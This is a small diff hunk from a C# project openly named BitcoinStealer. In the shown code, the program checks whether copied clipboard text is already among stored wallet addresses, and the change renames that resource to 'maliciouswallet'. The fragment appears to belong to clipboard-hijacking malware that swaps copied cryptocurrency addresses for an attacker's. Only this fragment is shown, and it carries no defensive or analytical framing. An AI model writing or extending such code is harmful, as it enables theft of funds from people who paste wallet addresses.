@@ -43,7 +43,7 @@ namespace BitcoinStealer
 
             // if clpbrd is already among the addresses return
             if (
-                Resources.vanityAddresses.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
+                Resources.maliciouswallet.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                     .ToList()
                     .Contains(clpbrd)) return;
 
